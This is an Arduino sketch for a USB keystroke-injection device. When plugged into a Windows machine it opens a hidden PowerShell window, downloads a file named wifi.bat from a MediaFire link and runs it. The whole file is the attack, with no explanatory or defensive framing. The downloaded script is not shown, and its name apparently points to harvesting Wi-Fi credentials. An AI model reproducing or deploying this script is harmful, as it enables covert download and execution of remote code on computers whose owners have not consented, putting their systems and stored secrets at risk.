#include <Keyboard.h> 
void setup()
{
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell -windowstyle hidden");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cd Documents");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("Invoke-WebRequest -Uri ('https://download1525.mediafire.com/o3cum9ncegwg/4frbzmve6lywwoi/wifi.bat') -O wifi.bat");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("./wifi.bat");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {}
